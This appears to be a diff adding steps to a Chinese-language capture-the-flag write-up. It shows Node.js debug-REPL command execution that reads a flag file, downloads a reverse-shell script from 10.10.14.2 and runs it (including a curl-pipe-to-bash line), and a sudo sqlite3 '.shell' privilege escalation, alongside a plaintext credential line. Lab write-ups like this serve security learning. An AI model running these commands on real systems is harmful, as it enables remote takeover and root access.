@@ -200,4 +200,17 @@ sam|Facebook|Test123!
 debug> repl
 Press Ctrl+C to leave debug repl
 > require('child_process').execSync('whoami').toString()
+require('child_process').execSync('cat /opt/flag.txt').toString()
+require('child_process').execSync('wget 10.10.14.2/revshells-python3.sh').toString()
+require('child_process').execSync('chmod +x revshells-python3.sh').toString()
+require('child_process').execSync('bash ./revshells-python3.sh').toString()
+require('child_process').execSync('curl 10.10.14.2/revshells-python3.sh | bash').toString()
+```
+
+![img](img/image_20250455-195553.png)
+
+## 提权
+
+```bash
+sudo /usr/bin/sqlite3 /dev/null '.shell /bin/bash'
 ```
